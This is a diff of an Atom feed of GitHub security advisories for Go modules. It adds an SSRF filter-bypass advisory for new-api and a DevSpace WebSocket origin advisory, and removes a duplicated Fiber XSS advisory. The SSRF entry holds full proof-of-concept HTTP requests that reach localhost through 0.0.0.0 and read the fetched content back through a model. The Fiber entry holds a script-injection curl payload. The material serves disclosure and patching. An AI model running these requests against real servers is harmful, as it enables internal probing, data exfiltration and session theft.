@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-06T17:05:11.795Z</updated>
+    <updated>2026-05-06T18:52:13.840Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,259 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/QuantumNous/new-api] QuantumNous/new-api has an SSRF Filter Bypass via 0.0.0.0]]></title>
+        <id>https://github.com/advisories/GHSA-v5c3-6wvc-pc2q</id>
+        <link href="https://github.com/advisories/GHSA-v5c3-6wvc-pc2q"/>
+        <updated>2026-05-06T17:23:21.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ssrf-filter-bypass-via-0000">SSRF Filter Bypass via <code>0.0.0.0</code></h1>
+<h3 id="summary">Summary</h3>
+<p>The SSRF protection introduced in v0.9.0.5 (CVE-2025-59146) and hardened in v0.9.6 (CVE-2025-62155) does not block the unspecified address <code>0.0.0.0</code>. A regular (non-admin) user holding any valid API token can send a multimodal request to <code>/v1/chat/completions</code>, <code>/v1/responses</code>, or <code>/v1/messages</code> with <code>0.0.0.0</code> as the image/file URL host, bypassing the private-IP filter and causing the server to issue HTTP requests to localhost. This constitutes at minimum a <strong>blind SSRF</strong>; when the request is routed through an AWS/Bedrock Claude adaptor, the fetched content is inlined into the model response, upgrading it to a <strong>full-read SSRF</strong>.</p>
+<h3 id="details">Details</h3>
+<h4 id="root-cause">Root Cause</h4>
+<p><code>common/ssrf_protection.go</code> — <code>isPrivateIP()</code> (lines 33–47) checks the following ranges:</p>
+<ul>
+<li><code>10.0.0.0/8</code></li>
+<li><code>172.16.0.0/12</code></li>
+<li><code>192.168.0.0/16</code></li>
+<li><code>127.0.0.0/8</code></li>
+<li><code>169.254.0.0/16</code></li>
+<li><code>224.0.0.0/4</code></li>
+<li><code>240.0.0.0/4</code></li>
+</ul>
+<p><strong><code>0.0.0.0/8</code> is not checked.</strong> On Linux, <code>0.0.0.0</code> resolves to the local machine, same as <code>127.0.0.1</code>.</p>
+<h4 id="default-fetch-settings">Default Fetch Settings</h4>
+<p><code>setting/system_setting/fetch_setting.go</code> (lines 16–24) defaults:</p>
+<ul>
+<li><code>EnableSSRFProtection: true</code></li>
+<li><code>AllowPrivateIp: false</code></li>
+<li><code>AllowedPorts: ["80", "443", "8080", "8443"]</code></li>
+<li><code>ApplyIPFilterForDomain: true</code></li>
+</ul>
+<p>So <code>0.0.0.0</code> on any of these four ports passes all checks.</p>
+<h4 id="data-flow-primary-chain--v1chatcompletions">Data Flow (primary chain — <code>/v1/chat/completions</code>)</h4>
+<pre><code>User API token
+→ /v1/chat/completions  (TokenAuth, no admin required)
+→ messages[].content[].image_url.url = "http://0.0.0.0:8080/..."
+→ dto/openai_request.go:111-117   createFileSource() recognises http(s):// as URL source
+→ dto/openai_request.go:119-198   GetTokenCountMeta() collects image_url.url / file.file_data / video_url
+→ service/token_counter.go:237-264 LoadFileSource() fetches URL when shouldFetchFiles == true
+→ service/file_service.go:135-143  loadFromURL() → DoDownloadRequest()
+→ service/download.go:52-68       ValidateURLWithFetchSetting() → 0.0.0.0 NOT blocked → GetHttpClient().Get()
+→ Server issues real TCP connection to 0.0.0.0
+</code></pre>
+<p><strong>Note on stream requirement:</strong> <code>common/init.go</code> (lines 140–141) defaults <code>GET_MEDIA_TOKEN=true</code> but <code>GET_MEDIA_TOKEN_NOT_STREAM=false</code>, so <code>stream: true</code> is needed to trigger the fetch path.</p>
+<h4 id="additional-affected-endpoints">Additional Affected Endpoints</h4>
+<p>The same <code>ValidateURLWithFetchSetting()</code> → <code>DoDownloadRequest()</code> sink is reachable from:</p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>User-controlled field</th>
+<th>Auth required</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/v1/chat/completions</code></td>
+<td><code>image_url.url</code>, <code>file.file_data</code>, <code>video_url</code></td>
+<td>Regular user token</td>
+</tr>
+<tr>
+<td><code>/v1/responses</code></td>
+<td><code>input_file.file_url</code>, <code>input_image.image_url</code></td>
+<td>Regular user token</td>
+</tr>
+<tr>
+<td><code>/v1/messages</code></td>
+<td><code>source.url</code> (type: <code>"url"</code>)</td>
+<td>Regular user token</td>
+</tr>
+<tr>
+<td><code>/api/user/setting</code></td>
+<td><code>webhook_url</code>, <code>bark_url</code>, <code>gotify_url</code></td>
+<td>Regular user (self)</td>
+</tr>
+</tbody></table>
+<h4 id="upgrade-to-full-read-ssrf-conditional">Upgrade to Full-Read SSRF (conditional)</h4>
+<p><code>relay/channel/aws/adaptor.go</code> (lines 41–61) — <code>ConvertClaudeRequest()</code>:</p>
+<ul>
+<li>If the request is routed to an AWS/Bedrock Claude channel, the adaptor iterates over message content</li>
+<li>When <code>source.type == "url"</code>, it calls <code>service.GetBase64Data()</code> which invokes the same <code>DoDownloadRequest()</code> path</li>
+<li>The fetched content is rewritten to <code>type: "base64"</code> and inlined into the model request</li>
+<li>The model then describes/transcribes the content in its response</li>
+</ul>
+<p>This means an attacker can read the actual content of internal resources (images, PDFs, text) through the model's output, not just detect open/closed ports.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p><strong>Prerequisites:</strong> A regular user account with a valid API token. No admin privileges required.</p>
+<p><strong>Step 1 — Control group: <code>127.0.0.1</code> is blocked</strong></p>
+<pre><code class="language-http">POST /v1/chat/completions HTTP/1.1
+Host: &lt;redacted&gt;
+Authorization: Bearer sk-&lt;user-token&gt;
+Content-Type: application/json
+
+{
+  "model": "gpt-4o-mini",
+  "stream": true,
+  "max_tokens": 1,
+  "messages": [
+    {
+      "role": "user",
+      "content": [
+        {"type": "text", "text": "describe"},
+        {
+          "type": "image_url",
+          "image_url": {
+            "url": "http://127.0.0.1:8080/probe.png",
+            "detail": "low"
+          }
+        }
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>Response:</p>
+<pre><code>private IP address not allowed: 127.0.0.1
+</code></pre>
+<p><strong>Step 2 — Experiment group: <code>0.0.0.0</code> bypasses the filter</strong></p>
+<pre><code class="language-http">POST /v1/chat/completions HTTP/1.1
+Host: &lt;redacted&gt;
+Authorization: Bearer sk-&lt;user-token&gt;
+Content-Type: application/json
+
+{
+  "model": "gpt-4o-mini",
+  "stream": true,
+  "max_tokens": 1,
+  "messages": [
+    {
+      "role": "user",
+      "content": [
+        {"type": "text", "text": "describe"},
+        {
+          "type": "image_url",
+          "image_url": {
+            "url": "http://0.0.0.0:8080/probe.png",
+            "detail": "low"
+          }
+        }
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>Response:</p>
+<pre><code>dial tcp 0.0.0.0:8080: connect: connection refused
+</code></pre>
+<p>The server attempted a real TCP connection — the SSRF filter was bypassed.</p>
+<p><strong>Step 3 — Confirm readback capability via multimodal model</strong></p>
+<pre><code class="language-http">POST /v1/chat/completions HTTP/1.1
+Host: &lt;redacted&gt;
+Authorization: Bearer sk-&lt;user-token&gt;
+Content-Type: application/json
+
+{
+  "model": "claude-3-5-sonnet-latest",
+  "stream": false,
+  "max_tokens": 32,
+  "messages": [
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "text",
+          "text": "Transcribe exactly the text in the image. Output only the text."
+        },
+        {
+          "type": "image_url",
+          "image_url": {
+            "url": "https://dummyimage.com/600x180/111/fff.png&amp;text=READBACK-OK-314159",
+            "detail": "low"
+          }
+        }
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{"choices":[{"message":{"content":"READBACK-OK-314159"}}]}
+</code></pre>
+<p>This confirms that when the fetch target returns readable content (image/PDF/text), the model's response leaks that content to the attacker. Combining Step 2 and Step 3: if an internal service on <code>0.0.0.0:&lt;allowed-port&gt;</code> returns image or document content, an attacker can exfiltrate it.</p>
+<h3 id="impact">Impact</h3>
+<p>An authenticated regular user (no admin privileges) can:</p>
+<ol>
+<li><strong>Probe localhost and internal services</strong> — Determine open/closed ports on the server by observing <code>connection refused</code> vs timeout vs HTTP-level errors. Default allowed ports are 80, 443, 8080, and 8443.</li>
+<li><strong>Exfiltrate internal content</strong> — When the request routes through a multimodal model (especially AWS/Bedrock Claude), the server fetches the resource and the model returns its content (OCR for images, summarization for PDFs/text).</li>
+<li><strong>Bypass all previous SSRF mitigations</strong> — This is a direct bypass of the <code>isPrivateIP()</code> check. No redirect chain, no DNS rebinding, no race condition required — just replacing <code>127.0.0.1</code> with <code>0.0.0.0</code>.</li>
+</ol>
+<p>Since user registration is often enabled by default, any registered user can exploit this.</p>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<ol>
+<li>Add <code>0.0.0.0/8</code> to the deny list in <code>isPrivateIP()</code> (<code>common/ssrf_protection.go</code>)</li>
+<li>Audit against the full <a href="https://www.iana.org/assignments/iana-ipv4-special-registry/"></a><a href="https://www.iana.org/assignments/iana-ipv4-special-registry/">IANA IPv4 Special-Purpose Address Registry</a> — also ensure coverage for:<ul>
+<li><code>0.0.0.0/8</code> ("This network")</li>
+<li><code>100.64.0.0/10</code> (Carrier-grade NAT)</li>
+<li><code>198.18.0.0/15</code> (Benchmarking)</li>
+<li>IPv6 equivalents: <code>::1</code>, <code>::</code>, <code>[::]</code>, <code>fe80::/10</code></li>
+</ul>
+</li>
+<li>Apply the same IP validation to post-redirect targets (already partially addressed in <code>service/http_client.go:24-33</code>, but does not help when the initial address itself bypasses the filter)</li>
+</ol>
+<h3 id="resources">Resources</h3>
+<ul>
+<li><strong>CVE-2025-59146</strong> (GHSA-xxv6-m6fx-vfhh): Original authenticated SSRF, patched in v0.9.0.5</li>
+<li><strong>CVE-2025-62155</strong> (GHSA-9f46-w24h-69w4): 302 redirect bypass of the SSRF fix, patched in v0.9.6</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/QuantumNous/new-api/security/advisories/GHSA-v5c3-6wvc-pc2q">https://github.com/QuantumNous/new-api/security/advisories/GHSA-v5c3-6wvc-pc2q</a></li>
+<li><a href="https://github.com/advisories/GHSA-9f46-w24h-69w4">https://github.com/advisories/GHSA-9f46-w24h-69w4</a></li>
+<li><a href="https://github.com/advisories/GHSA-v5c3-6wvc-pc2q">https://github.com/advisories/GHSA-v5c3-6wvc-pc2q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v5c3-6wvc-pc2q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:23:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/loft-sh/devspace] DevSpace UI Server WebSocket CheckOrigin does not validate source]]></title>
+        <id>https://github.com/advisories/GHSA-hqwm-7x7x-8379</id>
+        <link href="https://github.com/advisories/GHSA-hqwm-7x7x-8379"/>
+        <updated>2026-05-06T17:05:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description">Description</h3>
+<p>DevSpace's UI server WebSocket accepts connections from all origins by default, and therefore several endpoints are exposed via this WebSocket. When a developer runs the DevSpace UI and at the same time uses a browser to access the internet, a malicious website they visit can use their browser to establish a cross-origin WebSocket connection to <code>ws://127.0.0.1:8090</code>. This allows an attacker to access: </p>
+<ul>
+<li><code>/api/logs</code> to stream real-time pod logs</li>
+<li><code>/api/enter</code> to open an interactive shell inside the running pod</li>
+<li><code>/api/command</code> to execute pre-defined pipeline commands</li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>Versions 6.3.21 and above are patched.</p>
+<h3 id="resources">Resources</h3>
+<p><a href="https://pkg.go.dev/github.com/gorilla/websocket#hdr-Origin_Considerations">gorilla/websocket CheckOrigin documentation</a></p>
+<h3 id="installation-options">Installation Options</h3>
+<p>Devspace is no longer publishing to NPM or Yarn, please continue to use our <a href="https://www.devspace.sh/docs/getting-started/installation">other installation methods</a> to get updates in the future, including this patch.</p>
+<h3 id="credit">Credit</h3>
+<p>DevSpace thanks @b0b0haha for finding and reporting this vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/devspace-sh/devspace/security/advisories/GHSA-hqwm-7x7x-8379">https://github.com/devspace-sh/devspace/security/advisories/GHSA-hqwm-7x7x-8379</a></li>
+<li><a href="https://github.com/advisories/GHSA-hqwm-7x7x-8379">https://github.com/advisories/GHSA-hqwm-7x7x-8379</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hqwm-7x7x-8379</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:05:57.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/0xJacky/nginx-ui] Nginx-UI is Vulnerable to Unauthenticated Remote Code Execution via Backup Restore]]></title>
         <id>https://github.com/advisories/GHSA-4pvg-prr3-9cxr</id>
@@ -1923,277 +2176,5 @@ forged JWT requests signed with the leaked app.jwt_secret failed with 403 on the
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-25T21:30:22.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gofiber/fiber/v2] Fiber vulnerable to XSS in AutoFormat Content Negotiation]]></title>
-        <id>https://github.com/advisories/GHSA-qjv7-627w-8qjv</id>
-        <link href="https://github.com/advisories/GHSA-qjv7-627w-8qjv"/>
-        <updated>2026-05-05T20:13:24.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><strong>Description</strong></p>
-<p>A Cross-Site Scripting (CWE-79) vulnerability in Go Fiber allows a remote attacker to inject arbitrary HTML/JavaScript by supplying <code>Accept: text/html</code> on any request whose handler passes attacker-influenced data to the AutoFormat() feature. This affects <code>github.com/gofiber/fiber/v3</code> (<code>DefaultRes.AutoFormat</code>) through version 3.1.0 and <code>github.com/gofiber/fiber/v2</code> (<code>Ctx.Format</code>) through version 2.52.12. </p>
-<p>The developer opts into content negotiation by calling AutoFormat(), but does not opt into raw HTML emission for a particular request; Fiber chooses that branch from attacker-controlled Accept. Five of the six branches of the same method already escape. <code>JSON</code>, <code>XML</code>, <code>MsgPack</code>, and <code>CBOR</code> all route through encoders that neutralize markup; the txt branch emits <code>text/plain</code> and cannot execute. The html branch is the sole outlier in a method whose name (<code>AutoFormat</code>) and symmetrical structure actively telegraph "safe, format-agnostic reply."</p>
-<h2 id="details">Details</h2>
-<p>The issue resides in <code>res.go</code> within <code>(*DefaultRes).AutoFormat()</code>. The method negotiates against the request Accept header, selects one of <code>html | json | txt | xml | msgpack | cbor</code>, and serializes the caller-supplied body accordingly.</p>
-<p>The "html" branch concatenates the stringified body directly into HTML markup with no output encoding:</p>
-<ul>
-<li><code>accept</code> comes from <code>r.c.Accepts(...)</code>, i.e. is fully attacker-controlled. An attacker can force the "html" branch on any <code>AutoFormat()</code> call regardless of which format the developer tested against.</li>
-<li><code>b</code> is produced from <code>body</code> via direct assignment (<code>string</code> / <code>[]byte</code>) or <code>fmt.Sprintf("%v", body)</code>. No <code>html.EscapeString</code> is applied.</li>
-<li>The resulting string is sent as <code>text/html; charset=utf-8</code>, so browsers render it as active HTML.</li>
-</ul>
-<pre><code class="language-go">// res.go
-func (r *DefaultRes) AutoFormat(body any) error {
-
-    accept := r.c.DefaultReq.Accepts("html", "json", "txt", "xml", "msgpack", "cbor")
-
-    r.Type(accept)
-    var b string
-    switch val := body.(type) {
-    case string:
-        b = val
-    case []byte:
-        b = r.c.app.toString(val)
-    default:
-        b = fmt.Sprintf("%v", val)
-    }
-
-    switch accept {
-    case "txt":
-        return r.SendString(b)
-    case "json":
-        return r.JSON(body)
-    case "xml":
-        return r.XML(body)
-    case "html":
-        return r.SendString("&lt;p&gt;" + b + "&lt;/p&gt;")
-    case "msgpack":
-        return r.MsgPack(body)
-    case "cbor":
-        return r.CBOR(body)
-    }
-    return r.SendString(b)
-}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>This impacts all current v3 releases ≤ 3.1.0 containing <code>DefaultRes.AutoFormat</code>, and all current v2 releases ≤ 2.52.12 where the identical <code>"&lt;p&gt;" + b + "&lt;/p&gt;"</code> construction exists in <code>(*Ctx).Format()</code>. Exploitation requires that an application call <code>c.AutoFormat(v)</code> where <code>v</code> (or a field stringified by <code>%v</code>) contains request-influenced data.</p>
-<p>A handler that uses <code>AutoFormat()</code> to serve multiple representations of the same data can be turned into an HTML XSS sink when the client sends <code>Accept: text/html</code>, even if the developer only tested the JSON path.</p>
-<p>This may result in:</p>
-<ul>
-<li><strong>Reflected XSS</strong> in the application's origin via any request-derived value reaching <code>AutoFormat</code>.</li>
-<li><strong>Stored XSS</strong> where the reflected value originates from persisted input later passed to <code>AutoFormat</code>.</li>
-</ul>
-<h2 id="proposed-patch">Proposed Patch</h2>
-<p>The injection surface is <code>r.Type("html")</code> followed by <code>r.SendString(b)</code> with unescaped caller data, where it constructs markup on the caller's behalf around a value whose HTML-ness the caller did not declare. A few options:</p>
-<ul>
-<li><code>AutoFormat()</code> should treat <code>body</code> as data, not markup, in the <code>"html"</code> branch and escape it before concatenating it into the framework-generated <code>&lt;p&gt;</code> wrapper. Callers that need raw negotiated HTML should use <code>Format()</code> with an explicit HTML handler.</li>
-<li>Introduce a sibling method that escapes, leave <code>AutoFormat</code> alone for backward compatibility.</li>
-</ul>
-<p>HTML-escape the value in the "html" branch before concatenating it into the <code>&lt;p&gt;</code> wrapper.</p>
-<pre><code class="language-go">import "html"
-
-// ...
-case "html":
-    return r.SendString("&lt;p&gt;" + html.EscapeString(b) + "&lt;/p&gt;")
-</code></pre>
-<p><code>html.EscapeString</code> escapes <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>'</code>, <code>"</code>, which is sufficient for an element-text context. Apply the same change to v2's <code>(*Ctx).Format()</code>.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-bash"># Create project directory
-mkdir fiber-xss-poc &amp;&amp; cd fiber-xss-poc
-
-# Initialize Go module
-go mod init fiber-xss-poc
-
-# Install Fiber v3
-go get github.com/gofiber/fiber/v3
-
-# Create the PoC file
-cat &gt; main.go &lt;&lt; 'EOF'
-package main
-
-import (
-    "github.com/gofiber/fiber/v3"
-)
-
-type User struct {
-    ID   int    `json:"id"`
-    Name string `json:"name"`
-}
-
-func main() {
-    app := fiber.New()
-    
-    app.Get("/api/user", func(c fiber.Ctx) error {
-        user := User{
-            ID:   1,
-            Name: c.Query("name", "anonymous"),
-        }
-        return c.AutoFormat(user)
-    })
-
-    app.Listen(":3000")
-}
-EOF
-
-# Run it
-go run main.go
-}
-</code></pre>
-<p>Benign JSON</p>
-<pre><code class="language-bash">curl -s 'http://127.0.0.1:3000/api/user?name=Alice' -H 'Accept: application/json'
-{"id":1,"name":"Alice"}
-</code></pre>
-<p>HTML sink enables XSS</p>
-<pre><code class="language-bash">curl -s 'http://127.0.0.1:3000/api/user?name=&lt;script&gt;alert(document.domain)&lt;/script&gt;' -H 'Accept: text/html'
-&lt;p&gt;{1 &lt;script&gt;alert(document.domain)&lt;/script&gt;}&lt;/p&gt;
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-qjv7-627w-8qjv">https://github.com/gofiber/fiber/security/advisories/GHSA-qjv7-627w-8qjv</a></li>
-<li><a href="https://github.com/advisories/GHSA-qjv7-627w-8qjv">https://github.com/advisories/GHSA-qjv7-627w-8qjv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qjv7-627w-8qjv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T20:13:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gofiber/fiber/v3] Fiber vulnerable to XSS in AutoFormat Content Negotiation]]></title>
-        <id>https://github.com/advisories/GHSA-qjv7-627w-8qjv</id>
-        <link href="https://github.com/advisories/GHSA-qjv7-627w-8qjv"/>
-        <updated>2026-05-05T20:13:24.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><strong>Description</strong></p>
-<p>A Cross-Site Scripting (CWE-79) vulnerability in Go Fiber allows a remote attacker to inject arbitrary HTML/JavaScript by supplying <code>Accept: text/html</code> on any request whose handler passes attacker-influenced data to the AutoFormat() feature. This affects <code>github.com/gofiber/fiber/v3</code> (<code>DefaultRes.AutoFormat</code>) through version 3.1.0 and <code>github.com/gofiber/fiber/v2</code> (<code>Ctx.Format</code>) through version 2.52.12. </p>
-<p>The developer opts into content negotiation by calling AutoFormat(), but does not opt into raw HTML emission for a particular request; Fiber chooses that branch from attacker-controlled Accept. Five of the six branches of the same method already escape. <code>JSON</code>, <code>XML</code>, <code>MsgPack</code>, and <code>CBOR</code> all route through encoders that neutralize markup; the txt branch emits <code>text/plain</code> and cannot execute. The html branch is the sole outlier in a method whose name (<code>AutoFormat</code>) and symmetrical structure actively telegraph "safe, format-agnostic reply."</p>
-<h2 id="details">Details</h2>
-<p>The issue resides in <code>res.go</code> within <code>(*DefaultRes).AutoFormat()</code>. The method negotiates against the request Accept header, selects one of <code>html | json | txt | xml | msgpack | cbor</code>, and serializes the caller-supplied body accordingly.</p>
-<p>The "html" branch concatenates the stringified body directly into HTML markup with no output encoding:</p>
-<ul>
-<li><code>accept</code> comes from <code>r.c.Accepts(...)</code>, i.e. is fully attacker-controlled. An attacker can force the "html" branch on any <code>AutoFormat()</code> call regardless of which format the developer tested against.</li>
-<li><code>b</code> is produced from <code>body</code> via direct assignment (<code>string</code> / <code>[]byte</code>) or <code>fmt.Sprintf("%v", body)</code>. No <code>html.EscapeString</code> is applied.</li>
-<li>The resulting string is sent as <code>text/html; charset=utf-8</code>, so browsers render it as active HTML.</li>
-</ul>
-<pre><code class="language-go">// res.go
-func (r *DefaultRes) AutoFormat(body any) error {
-
-    accept := r.c.DefaultReq.Accepts("html", "json", "txt", "xml", "msgpack", "cbor")
-
-    r.Type(accept)
-    var b string
-    switch val := body.(type) {
-    case string:
-        b = val
-    case []byte:
-        b = r.c.app.toString(val)
-    default:
-        b = fmt.Sprintf("%v", val)
-    }
-
-    switch accept {
-    case "txt":
-        return r.SendString(b)
-    case "json":
-        return r.JSON(body)
-    case "xml":
-        return r.XML(body)
-    case "html":
-        return r.SendString("&lt;p&gt;" + b + "&lt;/p&gt;")
-    case "msgpack":
-        return r.MsgPack(body)
-    case "cbor":
-        return r.CBOR(body)
-    }
-    return r.SendString(b)
-}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>This impacts all current v3 releases ≤ 3.1.0 containing <code>DefaultRes.AutoFormat</code>, and all current v2 releases ≤ 2.52.12 where the identical <code>"&lt;p&gt;" + b + "&lt;/p&gt;"</code> construction exists in <code>(*Ctx).Format()</code>. Exploitation requires that an application call <code>c.AutoFormat(v)</code> where <code>v</code> (or a field stringified by <code>%v</code>) contains request-influenced data.</p>
-<p>A handler that uses <code>AutoFormat()</code> to serve multiple representations of the same data can be turned into an HTML XSS sink when the client sends <code>Accept: text/html</code>, even if the developer only tested the JSON path.</p>
-<p>This may result in:</p>
-<ul>
-<li><strong>Reflected XSS</strong> in the application's origin via any request-derived value reaching <code>AutoFormat</code>.</li>
-<li><strong>Stored XSS</strong> where the reflected value originates from persisted input later passed to <code>AutoFormat</code>.</li>
-</ul>
-<h2 id="proposed-patch">Proposed Patch</h2>
-<p>The injection surface is <code>r.Type("html")</code> followed by <code>r.SendString(b)</code> with unescaped caller data, where it constructs markup on the caller's behalf around a value whose HTML-ness the caller did not declare. A few options:</p>
-<ul>
-<li><code>AutoFormat()</code> should treat <code>body</code> as data, not markup, in the <code>"html"</code> branch and escape it before concatenating it into the framework-generated <code>&lt;p&gt;</code> wrapper. Callers that need raw negotiated HTML should use <code>Format()</code> with an explicit HTML handler.</li>
-<li>Introduce a sibling method that escapes, leave <code>AutoFormat</code> alone for backward compatibility.</li>
-</ul>
-<p>HTML-escape the value in the "html" branch before concatenating it into the <code>&lt;p&gt;</code> wrapper.</p>
-<pre><code class="language-go">import "html"
-
-// ...
-case "html":
-    return r.SendString("&lt;p&gt;" + html.EscapeString(b) + "&lt;/p&gt;")
-</code></pre>
-<p><code>html.EscapeString</code> escapes <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>'</code>, <code>"</code>, which is sufficient for an element-text context. Apply the same change to v2's <code>(*Ctx).Format()</code>.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-bash"># Create project directory
-mkdir fiber-xss-poc &amp;&amp; cd fiber-xss-poc
-
-# Initialize Go module
-go mod init fiber-xss-poc
-
-# Install Fiber v3
-go get github.com/gofiber/fiber/v3
-
-# Create the PoC file
-cat &gt; main.go &lt;&lt; 'EOF'
-package main
-
-import (
-    "github.com/gofiber/fiber/v3"
-)
-
-type User struct {
-    ID   int    `json:"id"`
-    Name string `json:"name"`
-}
-
-func main() {
-    app := fiber.New()
-    
-    app.Get("/api/user", func(c fiber.Ctx) error {
-        user := User{
-            ID:   1,
-            Name: c.Query("name", "anonymous"),
-        }
-        return c.AutoFormat(user)
-    })
-
-    app.Listen(":3000")
-}
-EOF
-
-# Run it
-go run main.go
-}
-</code></pre>
-<p>Benign JSON</p>
-<pre><code class="language-bash">curl -s 'http://127.0.0.1:3000/api/user?name=Alice' -H 'Accept: application/json'
-{"id":1,"name":"Alice"}
-</code></pre>
-<p>HTML sink enables XSS</p>
-<pre><code class="language-bash">curl -s 'http://127.0.0.1:3000/api/user?name=&lt;script&gt;alert(document.domain)&lt;/script&gt;' -H 'Accept: text/html'
-&lt;p&gt;{1 &lt;script&gt;alert(document.domain)&lt;/script&gt;}&lt;/p&gt;
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-qjv7-627w-8qjv">https://github.com/gofiber/fiber/security/advisories/GHSA-qjv7-627w-8qjv</a></li>
-<li><a href="https://github.com/advisories/GHSA-qjv7-627w-8qjv">https://github.com/advisories/GHSA-qjv7-627w-8qjv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qjv7-627w-8qjv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T20:13:23.000Z</published>
     </entry>
 </feed>
